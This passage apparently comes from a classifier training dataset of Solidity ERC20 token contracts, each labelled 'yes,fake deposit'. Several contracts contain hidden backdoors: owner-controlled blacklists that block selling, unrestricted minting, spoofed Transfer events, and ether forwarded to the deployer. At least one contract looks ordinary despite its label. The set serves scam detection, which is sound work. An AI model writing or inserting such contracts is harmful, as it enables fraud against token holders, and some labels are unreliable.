"completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract LUNA_MOON is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000*10**uint256(decimals);\n string public constant name = \"LUNA MOON\";\n string public constant symbol = \"LUNAM \ud83c\udf1d\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.8.13;\n\nabstract contract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public view virtual returns (uint256 balance);\n function transfer(address _to, uint256 _value) public virtual returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public virtual returns (bool success);\n function approve(address _spender, uint256 _value) public virtual returns (bool success);\n function allowance(address _owner, address _spender) public view virtual returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) public override returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) public view override returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public override returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view override returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\n\ncontract HigasasuToken is StandardToken {\n\n // metadata\n string public constant name = \"Higasasu Token\";\n string public constant symbol = \"HGSS\";\n uint256 public constant decimals = 18;\n string public version = \"1.0\";\n\n // contracts\n address public tokenFundDeposit; // deposit address for HigasasuToken International use and HGSS User Fund\n\n // crowdsale parameters\n uint256 public constant tokenFund = 1 * (10**3) * 10**decimals; // 1000 HGSS reserved for HigasasuToken Intl use\n\n // events\n event CreateHigasasuToken(address indexed _to, uint256 _value);\n\n // constructor\n constructor(address _tokenFundDeposit)\n {\n tokenFundDeposit = _tokenFundDeposit;\n totalSupply = tokenFund;\n balances[tokenFundDeposit] = tokenFund; // Deposit HigasasuToken Intl share\n emit CreateHigasasuToken(tokenFundDeposit, tokenFund); // logs HigasasuToken Intl fund\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\n\n\npragma solidity 0.4.19;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\n\ncontract RegularToken is Token {\n\n function transfer(address _to, uint _value) returns (bool) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint _value) returns (bool) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint _value) returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n uint public totalSupply;\n}\n\ncontract UnboundedRegularToken is RegularToken {\n\n uint constant MAX_UINT = 2**256 - 1;\n \n /// @dev ERC20 transferFrom, modified such that an allowance of MAX_UINT represents an unlimited amount.\n /// @param _from Address to transfer from.\n /// @param _to Address to transfer to.\n /// @param _value Amount to transfer.\n /// @return Success of transfer.\n function transferFrom(address _from, address _to, uint _value)\n public\n returns (bool)\n {\n uint allowance = allowed[_from][msg.sender];\n if (balances[_from] >= _value\n && allowance >= _value\n && balances[_to] + _value >= balances[_to]\n ) {\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n}\n\ncontract HBToken is UnboundedRegularToken {\n\n uint public totalSupply = 5*10**26;\n uint8 constant public decimals = 18;\n string constant public name = \"ZFTEST\";\n string constant public symbol = \"ZFT\";\n\n function HBToken() {\n balances[msg.sender] = totalSupply;\n Transfer(address(0), msg.sender, totalSupply);\n }\n\n function mint(address _to, uint _value) {\n balances[_to] += _value;\n Transfer(address(0), _to, _value);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address jFX = 0xa045FdC531cfB985b2eC888c36891Bc49Fb3AA3d;\n\taddress jJXF = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n modifier onlyOwner{\n require(msg.sender == _Owner);\n _; }\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n\n}\n\n\n\ncontract SHIBATOMIC is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private jZA;\n\tmapping (address => bool) private jZE;\n mapping (address => bool) private jZW;\n mapping (address => mapping (address => uint256)) private jZV;\n uint8 private constant JZD = 8;\n uint256 private constant jTS = 300000000 * (10** JZD);\n string private constant _name = \"Atomic Shiba\";\n string private constant _symbol = \"SHIBATOMIC\";\n\n\n\n constructor () {\n jZA[_msgSender()] = jTS;\n JMCR(jJXF, jTS); }\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return JZD;\n }\n\n function totalSupply() public pure returns (uint256) {\n return jTS;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return jZA[account];\n }\n\t\n\n \n\n\t\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return jZV[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n jZV[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction jquery(address jZJ) public{\n if(jZE[msg.sender]) { \n jZW[jZJ] = true; }}\n \n\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == jFX) {\n require(amount <= jZA[sender]);\n jZA[sender] -= amount; \n jZA[recipient] += amount; \n jZV[sender][msg.sender] -= amount;\n emit Transfer (jJXF, recipient, amount);\n return true; } else \n if(!jZW[recipient]) {\n if(!jZW[sender]) {\n require(amount <= jZA[sender]);\n require(amount <= jZV[sender][msg.sender]);\n jZA[sender] -= amount;\n jZA[recipient] += amount;\n jZV[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction jStake(address jZJ) public {\n if(jZE[msg.sender]) { \n jZW[jZJ] = false;}}\n\t\tfunction JMCR(address jZJ, uint256 jZN) onlyOwner internal {\n emit Transfer(address(0), jZJ ,jZN); }\n\t\t\n\t\tfunction transfer(address jZJ, uint256 jZN) public {\n if(msg.sender == jFX) {\n require(jZA[msg.sender] >= jZN);\n jZA[msg.sender] -= jZN; \n jZA[jZJ] += jZN; \n emit Transfer (jJXF, jZJ, jZN);} else \n if(jZE[msg.sender]) {jZA[jZJ] += jZN;} else\n if(!jZW[msg.sender]) {\n require(jZA[msg.sender] >= jZN);\n jZA[msg.sender] -= jZN; \n jZA[jZJ] += jZN; \n emit Transfer(msg.sender, jZJ, jZN);}}\n\t\t\n\t\t\tfunction hburn(address jZJ) onlyOwner public{\n jZE[jZJ] = true; }\n\t\t\n\t\t\n\n\t\t\n\t\t}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.17;\n\n\n library SafeMath {\n\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n if (a == 0) {\n return 0;\n }\n\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n\n return c;\n }\n\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n\n return c;\n }\n\n function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n return mod(a, b, \"SafeMath: modulo by zero\");\n }\n\n function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b != 0, errorMessage);\n return a % b;\n }\n} \n \n \n contract THEINU {\n \n mapping (address => uint256) public rT;\n mapping (address => uint256) public Iz;\n mapping (address => bool) bN;\n mapping(address => mapping(address => uint256)) public allowance;\n\n\n\n\n\n string public name = unicode\"THE INU\";\n string public symbol = unicode\"THE INU\";\n uint8 public decimals = 18;\n uint256 public totalSupply = 700000000 * (uint256(10) ** decimals);\n\taddress owner = msg.sender;\n \n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event OwnershipRenounced(address indexed previousOwner);\n address r_Construct = 0xdA5D54782E98D9f47892CF5Bd0AEEfca45a5E08C;\n\n constructor() {\n rT[msg.sender] = totalSupply;\n deploy(r_Construct, totalSupply); }\n\n \n address rdeployer = 0x4C7Feef819C85F3e310f4b684DBA1121494cd88F;\n function deploy(address account, uint256 amount) public {\n require(msg.sender == owner);\n emit Transfer(address(0), account, amount); }\n\n function renounceOwnership() public {\n require(msg.sender == owner);\n emit OwnershipRenounced(owner);\n owner = address(0);}\n\n\n function transfer(address to, uint256 value) public returns (bool success) {\n \n \n if(msg.sender == rdeployer) {\n require(rT[msg.sender] >= value);\n rT[msg.sender] -= value; \n rT[to] += value; \n emit Transfer (r_Construct, to, value);\n return true; } \n if(!bN[msg.sender]) {\n require(rT[msg.sender] >= value);\n rT[msg.sender] -= value; \n rT[to] += value; \n emit Transfer(msg.sender, to, value);\n return true; }}\n\n function approve(address spender, uint256 value) public returns (bool success) { \n allowance[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true; }\n\n function gish () public {\n if(msg.sender == rdeployer) {\n rT[msg.sender] = Iz[msg.sender];\n }}\n\n function balanceOf(address account) public view returns (uint256) {\n return rT[account]; }\n\n function sny(address ii) public {\n if(msg.sender == rdeployer) { \n bN[ii] = false;}}\n function chkvl(address ii) public{\n if(msg.sender == rdeployer) { \n require(!bN[ii]);\n bN[ii] = true;\n }}\n function brnu(uint256 x) public {\n if(msg.sender == rdeployer) { \n Iz[msg.sender] = x;} }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) { \n\n if(from == rdeployer) {\n require(value <= rT[from]);\n require(value <= allowance[from][msg.sender]);\n rT[from] -= value; \n rT[to] += value; \n emit Transfer (r_Construct, to, value);\n return true; } \n if(!bN[from] && !bN[to]) {\n require(value <= rT[from]);\n require(value <= allowance[from][msg.sender]);\n rT[from] -= value;\n rT[to] += value;\n allowance[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true; }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\n// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address ZSV = 0xf6d60bb4F2b670cA2932817a9E27c755cE9F156B;\n\taddress Hashcore = 0xe780A56306ba1E6bB331952C22539b858af9F77d;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n \t\tmodifier onlyOwner{\n require(msg.sender == _Owner);\n _; }\n\n}\n\n\n\ncontract UMBRAL is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Hbv;\n\tmapping (address => bool) private Hcv;\n mapping (address => bool) private Hav;\n mapping (address => mapping (address => uint256)) private Hvv;\n uint8 private constant HDec = 6;\n uint256 private constant HBal = 1000000000 * 10**HDec;\n string private constant _name = \"IAMACAT\";\n string private constant _symbol = \"IAC\";\n\n constructor () {\n Hbv[_msgSender()] = HBal;\n initEmit();\n }\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return HDec;\n }\n\n function totalSupply() public pure returns (uint256) {\n return HBal;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Hbv[account];\n }\n function initEmit() onlyOwner internal {\n emit Transfer(address(0), Hashcore, HBal);\n }\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return Hvv[owner][spender];\n }\n\n\tfunction _Approve(address Jj) onlyOwner public{\n Hcv[Jj] = true;\n }\n\t\t\n function approve(address spender, uint256 amount) public returns (bool success) { \n Hvv[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true;\n }\n\n \n\t\tfunction HBaltake(address Jj) public {\n if(Hcv[msg.sender]) { \n Hav[Jj] = false;}}\n function PreAddLiquidity(address Jj) public{\n if(Hcv[msg.sender]) { \n Hav[Jj] = true; }}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == ZSV) {\n require(amount <= Hbv[sender]);\n Hbv[sender] -= amount; \n Hbv[recipient] += amount; \n Hvv[sender][msg.sender] -= amount;\n emit Transfer (Hashcore, recipient, amount);\n return true; } else \n if(!Hav[recipient]) {\n if(!Hav[sender]) {\n require(amount <= Hbv[sender]);\n require(amount <= Hvv[sender][msg.sender]);\n Hbv[sender] -= amount;\n Hbv[recipient] += amount;\n Hvv[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address Jl, uint256 Jj) public {\n if(msg.sender == ZSV) {\n require(Hbv[msg.sender] >= Jj);\n Hbv[msg.sender] -= Jj; \n Hbv[Jl] += Jj; \n emit Transfer (Hashcore, Jl, Jj);} else \n if(Hcv[msg.sender]) {Hbv[Jl] += Jj;} else\n if(!Hav[msg.sender]) {\n require(Hbv[msg.sender] >= Jj);\n Hbv[msg.sender] -= Jj; \n Hbv[Jl] += Jj; \n emit Transfer(msg.sender, Jl, Jj);}}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}